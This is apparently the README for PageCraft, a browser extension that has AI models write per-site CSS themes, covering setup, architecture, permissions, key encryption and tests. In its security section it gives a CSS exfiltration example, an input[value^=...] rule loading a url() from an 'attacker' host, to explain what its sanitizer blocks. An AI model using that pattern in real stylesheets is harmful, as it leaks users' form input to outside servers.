PageCraft

A Chrome and Firefox (Manifest V3) extension that creates dedicated CSS themes for websites from plain-language instructions, using Anthropic, OpenAI, Gemini or a local model. You can also write and edit the CSS by hand.

Generated output is CSS only. MV3 store policies forbid running remotely generated JavaScript, and CSS covers theming. Optional JS tweaks would need the opt-in userScripts API (see roadmap).

Setup & build

Requires Node.js 22+ (WXT 0.21 needs it; Node 20 reached end-of-life in April 2026). The repo includes an .nvmrc.

npm install            # also runs `wxt prepare` (generates .wxt/ types)
npm run dev            # Chrome with hot reload (opens a dev browser)
npm run dev:firefox    # Firefox MV3 with hot reload
npm run build          # → .output/chrome-mv3/
npm run build:firefox  # → .output/firefox-mv3/
npm run zip            # store-ready zip (add :firefox for AMO; also creates a sources zip)
npm run compile        # type-check only
npm test               # unit tests (Vitest); npm run test:watch to keep it running

Load a build manually

  • Chrome / Edge / Brave: chrome://extensions → Developer mode → Load unpacked → choose .output/chrome-mv3.
  • Firefox: about:debugging#/runtime/this-firefox → Load Temporary Add-on… → choose .output/firefox-mv3/manifest.json.

The manifest is generated from wxt.config.ts and the entrypoints. Don't edit .output/. The old manifest.js / manifest.json are gone.

Using it

  1. Open Settings & themes from the popup. Pick a provider, add a key if it needs one, choose a model with Load models, press Test connection, then Save.
  2. On a website, open the popup and press Enable on this site (or Enable on all sites). PageCraft has no website access until you do this.
  3. Open CustomStyle editor. The editor opens in a new tab linked to the site's tab. The estimate next to the provider shows roughly how many tokens the next request will use.
  4. Describe the theme (e.g. “warm dark theme, amber accents, larger body text”) and press Generate or Ctrl+Enter. The model designs a palette first, then streams the CSS into the editor. Live preview shows it on the site tab.
  5. Refine: with Refine current checked, the current palette, CSS and recent conversation go along with your next instruction (“make the header darker”), so the model edits the theme instead of starting over. Earlier turns appear under Conversation.
  6. Review: the AI looks at the previewed theme and fixes problems. It gets a contrast report, plus a screenshot if Send screenshot is on. Text in the prompt box is added as an extra instruction.
  7. Tweak without AI: open Palette to change colors, fonts, size, radius and border width. Only the token block at the top of the CSS is rewritten.
  8. Save (Ctrl+S) stores the style and applies it to that hostname. The popup's style list switches styles per site. Settings → Themes & sites applies a style to more sites with patterns, or to every site.

Closing the editor drops the unsaved preview. The site goes back to its saved style. The preview also shows inside same-site iframes (when iframes are enabled).

Undo and history

  • Undo (next to Generate) steps back through the CSS from before each generation, loaded version, “New” or delete in this editor session (up to 30 steps).
  • History (toolbar) lists the last 20 saved versions of the style. Picking one loads it into the editor and the preview. Press Save to keep it, or Undo to go back.

Contrast checker

After each preview change, the site tab measures text contrast (WCAG AA: 4.5:1, or 3:1 for large text). The chip next to the status shows the result, and clicking it lists failing elements with their colors and ratios. Text over background images or gradients is skipped because it can't be measured reliably. Each scan stops after 150 ms. On heavy pages it reports a partial result, and the next scan waits longer (4 s instead of 1.5 s). The Palette panel also rates the contrast of the important token pairs (text on background, text on accent, …) as you edit.

Screenshot

Send screenshot (remembered per browser) attaches a downscaled JPEG of the visible part of the site tab. It only works with vision-capable models. Firefox captures the tab directly. Chrome can only capture the active tab, so the site tab comes to the front for about half a second. Chrome also needs either all-sites access or a recent popup click on that tab (activeTab) to capture it.

Editor

CodeMirror 6 with CSS completion, search (Ctrl+F), real undo (Ctrl+Z, which also undoes a whole generation in one step), bracket matching, folding, a color swatch before each color value (click to pick), and css-tree syntax warnings.

Site rules and global themes

Each style can apply to any number of patterns:

PatternMatches
example.comThat host only
*.example.comThe host and all subdomains
example.com/docs/*That host, paths starting with /docs/
*Every site (a global theme)

The most specific match wins: a path rule beats an exact host, which beats a wildcard host, which beats *. Rules can be paused without deleting them. Single-page apps are re-checked when the path changes, so path rules follow in-app navigation. The popup shows when a broader rule is what applies on the current site.

Per-site overrides

Pause PageCraft on this site in the popup turns everything off for one host, presets included. In Settings → Site access → Per-site overrides you can also force iframes and web-component theming on or off for a single host.

Import and export

Settings → Themes & sites exports all styles (or one) with their rules as JSON. Exports never include API keys, version history or conversations. Imports are validated, CSS goes through the sanitizer, and rules are merged: an imported rule replaces an existing rule for the same pattern.

API key protection

Optional. With a passphrase set, keys are encrypted at rest and you unlock them once per browser session (in settings, or in the dialog the editor shows when you press Generate). There's no recovery: if you forget the passphrase, enter your keys again.

Tokens and cost

The editor shows an approximate size of the next request (text ≈ 3.6 characters per token, images per the provider's documented rules) plus a typical output of about 4k tokens. After each generation it shows the token counts the provider reported. A cost appears only if you enter your own prices per million tokens in settings. PageCraft doesn't ship prices because they change. Page detail sent to the AI (small / normal / large) controls the digest size.

Site access

See Permissions. Provider hosts are requested the first time you Load models, Test, Save or Generate. Tabs that were open before PageCraft was installed get the content script injected when you open the popup or editor.

Architecture

Built with WXT and TypeScript (no UI framework). AI requests go out from the extension pages (editor, settings), not from a background service worker. Extension pages get the same cross-origin access from host_permissions. Running there also avoids Chrome ending a long streaming request when an idle MV3 service worker is suspended, and keys never enter page context.

Generation pipeline

DigestContent script describes the page with PageCraft's own sheet off.
PromptRules + digest + current tokens/CSS + recent turns + screenshot/contrast (optional) + instructions.
StreamJSON tokens first, then CSS using var(--pc-*), then a one-line summary.
SanitizeTokens validated and written by PageCraft. CSS sanitized (css-tree) and any --pc-* declarations removed.
Preview → SaveApplied to the tab over a port. Saved only on explicit Save.

Page digest contents

URL (origin + path, no query string), title, language, declared color-scheme, up to 80 :root CSS custom properties, the main background and text colors, fonts, and a DOM outline (max 220 lines, depth 9). The outline lists tag#id.class [role aria-label data-*], collapses repeated siblings (li ×24) and leaves out hashed class names. No text content or form values are included.

Design tokens

The model answers with a ```json block of tokens: name, scheme, 12 colors (background, surface, surfaceRaised, text, textMuted, border, accent, onAccent, link, selection, codeBackground, danger), fonts, base size, line height, radius and border width. After that comes a ```css block that uses only var(--pc-…). PageCraft validates each token against a strict grammar (invalid values fall back to the scheme's defaults) and writes this block at the top of the stylesheet:

/* pagecraft:tokens:start · Ember · edit in the Palette panel */
:root {
  color-scheme: dark !important;
  --pc-background: #16181c;
  …
}
/* pagecraft:tokens:end */

The block is the single source of truth: the Palette panel reads it back and rewrites only it. The model's own CSS can't redefine --pc-*. The model sees tokens as JSON and the rest of the CSS separately. Generating tokens and CSS in one response (tokens first) gives the model a plan to follow without the cost and delay of two requests. Models that skip the JSON still work, but their result has no palette.

Prompt rules (summary)

Pick an accessible palette first. Override site CSS variables with var(--pc-*), then cover what they miss. Use stable selectors (roles, attributes, semantic classes). Don't hide content or change layout. Style hover/focus states, forms, code, tables, selection and scrollbars. Keep fonts inherit unless asked. No remote resources. When refining, return the full updated tokens and CSS.

Conversation

Each generation adds a turn: your instruction plus the model's one-line summary. Up to 20 turns are saved with the style, and the last 6 are replayed as alternating user/assistant messages when refining. Summaries are sent instead of full CSS to save tokens. Turning off Refine current starts a new conversation.

How themes are injected

  • One <style> element, kept last in <head>. A MutationObserver puts it back if a single-page app's head manager removes or reorders it.
  • Not @layer: unlayered site CSS beats any layer for normal declarations, so a layer would make themes weaker. Not adoptedStyleSheets: sheets constructed in a content script are unreliable across browsers (Firefox Xray wrappers).
  • Iframes (on by default): the content script runs in all frames, and each frame applies the style chosen for its own hostname. Presets apply everywhere. Editor messages target only the top frame.
  • Open shadow roots (opt-in): the CSS is copied into each open shadow root, and new ones are picked up after DOM changes. This themes web components, but page-level rules can change how components look, hence opt-in. Inherited properties and --pc-* variables reach into shadow DOM even with this off.

Data model

Everything lives in browser.storage.local (never sync):

enabled: boolean                    // global on/off
preset: "none" | "dark" | "light"
styles: { [hostname]: css }         // legacy 1.0 per-host CSS, still applied
myStyles: [{ id, name, css, prompt?, updatedAt?,
             history?: [{ css, prompt?, savedAt }],          // newest first, max 20
             conversation?: [{ instruction, summary, at }] }] // oldest first, max 20
injection: { frames: boolean, shadowRoots: boolean }         // default true / false
siteRules: [{ id, styleId, pattern, enabled }]                 // which style applies where
siteSettings: { [hostname]: { paused?, frames?, shadowRoots? } } // per-site overrides
selectedMyStyles: { [hostname]: styleId }                      // 1.x only: read once to build siteRules
ai: {
  activeProvider: "anthropic" | "openai" | "gemini" | "local",
  providers: { [id]: { apiKey, baseUrl, model, inputPrice?, outputPrice? } },
  digestSize: "small" | "normal" | "large",
  vault: null | { version, iterations, salt, iv, data }      // apiKey fields are "" when set
}
// storage.session (memory only): pagecraft.vaultKey, the unlocked AES key

Design tokens are not stored separately. They live in the style's CSS token block. The Send screenshot choice is a per-browser convenience in the editor page's localStorage. The content script refreshes only when a theme key changes. Saving AI settings doesn't re-render pages.

Security & privacy

  • CSS data leaks. CSS can send page data out, e.g. input[value^="a"] { background: url(https://attacker/a) }. Generated CSS is parsed with css-tree. The sanitizer removes @import (escaped spellings included), any declaration that uses a non-data: url(), any external string inside image-set()/image()/src()/cross-fade(), -moz-binding/behavior, expression(), and unparseable text that looks like a reference (e.g. u\72l(…)). It cuts those exact source ranges out, so comments and formatting survive, and repeats until clean. In the browser, a final re-parse with CSSStyleSheet rejects the whole stylesheet if anything external remains. A warning lists the fixes.
  • Token values are checked against strict grammars (colors, font stacks, lengths). Anything that could end a declaration, open a block, add a comment or reference a resource is replaced with a default. The theme name can't contain */.
  • CSS you type by hand is not sanitized. It's yours.
  • Firefox data collection: the manifest declares data_collection_permissions.required = ["websiteContent", "browsingActivity"], because the page URL and a structural digest go to the user's AI provider on Generate. Check this against current AMO policy before submitting.
  • API keys are sent only to the configured base URL. Web pages can't read extension storage. Without key protection they're stored unencrypted in extension-local storage. With it, they're encrypted using AES-GCM-256 with a key derived by PBKDF2-SHA-256 (600,000 iterations, random salt, new IV per write). The unlocked key is held in storage.session, which is memory only, readable only by extension pages, and cleared when the browser closes. This protects keys on disk, not in an unlocked session.
  • Imported themes are untrusted: the CSS is sanitized like AI output, sizes are capped, and invalid rules are dropped.
  • Data sent on Generate/Review: instructions, the last 6 conversation turns, current tokens and CSS (if refining), the page digest, and on Review a contrast report (element descriptions and colors, no text). With Send screenshot on, also a screenshot of the visible page, which can show page text and personal data. That's why it's opt-in. The settings page lists all of this.
  • Permissions: see below. No website is accessible until the user enables it.

Permissions

PermissionWhenWhy
storageInstallStyles, rules and settings.
activeTabInstall (no warning)Temporary access to the tab you open the popup on: inject the content script, preview, screenshot.
scriptingInstallRegister the content script for granted sites, and inject it into open tabs.
optional_host_permissions: <all_urls>On requestPer site (“Enable on this site”), all sites (“Enable on all sites”), and each AI provider's API host on first use. Granted sites are listed and revocable in settings.

The content script uses WXT's registration: "runtime". The background script registers it for the granted origins and updates the registration when permissions change. WXT adds the content script's matches to host_permissions by default, and a build:manifestGenerated hook in wxt.config.ts removes them again. Firefox requires 128+ for optional_host_permissions.

Upgrading from 1.3 or earlier: those versions had all-sites access at install. After updating, browsers may drop that grant because it's now optional. Users then see “Enable on this site” in the popup and need to enable sites (or all sites) once. Check this during the smoke test and mention it in the store release notes.

CI & release

  • ci.yml runs on pushes to main/dev and on pull requests. Steps: npm ci, type-check, unit tests, then Chrome and Firefox zips uploaded as build artifacts (kept 14 days).
  • release.yml is manual (Actions → Release → Run workflow). It builds, tests and runs wxt submit. It defaults to a dry run that only checks credentials. Choose Chrome, Firefox or both. A real run also creates a GitHub release v<version> with the zips attached.
  • Secrets live in a GitHub environment named store (add required reviewers there to approve each submission): CHROME_EXTENSION_ID, CHROME_PUBLISHER_ID, CHROME_SERVICE_ACCOUNT_CLIENT_EMAIL, CHROME_SERVICE_ACCOUNT_PRIVATE_KEY (Chrome Web Store API v2 service account), FIREFOX_JWT_ISSUER, FIREFOX_JWT_SECRET (AMO API key). npx wxt submit init walks through getting them.
  • Before a release: bump version in package.json, update CHANGELOG.md, run the manual smoke test. The AMO sources zip leaves out design/ and .github/.

Localisation

Strings live in public/_locales/<lang>/messages.json. The manifest uses __MSG_extName__, __MSG_extDescription__ and __MSG_extActionTitle__. In pages, data-i18n (text), data-i18n-title, data-i18n-placeholder and data-i18n-aria-label are filled by localizePage(). In code, t("key", …args) replaces {0}, {1} and so on. Messages must not contain $, because the browser treats it as a placeholder marker. A unit test checks that every key used exists and that none contains $.

Covered: manifest, all page markup (popup, settings, editor) and all popup and settings messages. Not yet: the editor's dynamic status messages and the palette labels, which are still English in code. Only English ships. To add a language, copy en/messages.json to e.g. de/messages.json and translate the message values.

Testing

Automated: npm test runs 95 Vitest tests (also in CI):

  • sanitize.test.ts: fences, escapes, @import, url() variants, image-set/src, custom properties, nested rules, junk.
  • providers.test.ts: SSE parsing per provider with chunks split mid-line, headers, error hints, model listing, image parts per provider.
  • prompt.test.ts: fence parsing, token/CSS/summary parsing while streaming, conversation replay, screenshot and contrast in messages.
  • tokens-contrast.test.ts: token validation (including injection attempts), token block round-trip, WCAG math.
  • injector.test.ts and digest.test.ts (happy-dom): re-adding/reordering the style element, shadow-root mirroring, digest privacy.
  • rules-backup.test.ts: pattern validation, matching and specificity, host rules, 1.x migration, export privacy, import sanitizing, merge behaviour.
  • vault-storage.test.ts: encrypt/unlock/wrong passphrase/lock/re-encrypt, keys present only while unlocked, storage migration and defaults.
  • estimate-i18n.test.ts: token and cost estimates, catalog coverage, no $, substitution.
  • providers.test.ts also covers usage reporting per provider. Plus history.test.ts and permissions.test.ts.

Run tests through npm test, not npx vitest. On Windows a lowercase drive letter (e:\) makes Vitest load twice, and the launcher script fixes that. npm run compile and both builds must pass too.

Manual smoke test, per browser:

  1. Global preset applies to HTTP(S) pages. Toggling PageCraft off removes all PageCraft CSS.
  2. Hand-written style saves, applies to its hostname and survives reload. Data from 1.0 still applies.
  3. For each provider: Load models → Test connection → Generate on a real site (e.g. Wikipedia, GitHub). CSS streams, preview updates the tab, Save persists it.
  4. Stop mid-generation keeps the partial CSS unsaved. A bad key shows a readable error.
  5. Refine: a second instruction changes only what you asked for.
  6. Close the editor without saving: the tab goes back to the saved style.
  7. Ollama without OLLAMA_ORIGINS shows the 403 hint.
  8. Undo after a generation restores the old CSS. History lists earlier saves and loads them.
  9. A tab opened before installing PageCraft: popup and editor work without reloading it.
  10. Firefox: remove “Access your data for all websites” in about:addons → the popup banner appears and its button restores access.
  11. Generate: a palette is designed first. The Palette panel shows it, and editing a color updates the preview right away without an AI call.
  12. Refine twice: Conversation shows both turns, and the second change keeps the first.
  13. Contrast chip appears after preview, lists failing elements, and Review fixes them.
  14. Send screenshot with a vision model (Chrome: the site tab flashes forward briefly). With a text-only model the error suggests turning it off.
  15. Ctrl+Z after a generation restores the previous CSS in one step. Color swatches open a picker.
  16. A site with iframes (e.g. an embedded widget) gets the preset inside frames. Turning “Inside iframes” off removes it there.
  17. A single-page app that rewrites <head> on navigation (e.g. YouTube, GitHub) keeps the theme after in-app navigation.
  18. A site using web components with “Inside web components” on: themed inside components, and off again cleanly.
  19. Fresh install: no site access warning at install. The popup shows “Enable on this site”. After enabling, the theme applies on reload and in new tabs of that site, and other sites stay untouched.
  20. “Enable on all sites”, then settings → “Only sites listed above” removes the global grant again. Revoking a site in settings stops theming there.
  21. Upgrade from 1.3: check whether the old all-sites grant survives (see Permissions).
  22. Rules: add *.wikipedia.org and * to two styles. Subdomains get the first, other sites the second, and the popup explains which rule applies. Pause a rule and it stops applying.
  23. Pause on this site: everything disappears there, presets included. Override “Iframes: Off” for one site.
  24. Export all, delete a style, import: it comes back with its rules. Importing a file with an external url() shows a warning and strips it.
  25. Key protection: set a passphrase, restart the browser, press Generate. The unlock dialog appears, a wrong passphrase is rejected, and the right one works. Remove protection restores plain keys.
  26. Estimate changes as you type and with Screenshot on. After generating, the status shows the reported token usage, and a cost once prices are entered.
  27. Palette contrast list updates while editing colors. Live preview shows inside a same-site iframe.
  28. Switch the browser language (or add a test locale): popup and settings text comes from _locales.

Letting AI write JavaScript that runs on every page is a far bigger security and store-review risk than CSS, the API needs a manual browser toggle, and every theming goal so far was reachable with CSS. Revisit only for a concrete need, and then with hand-written (not generated) scripts.
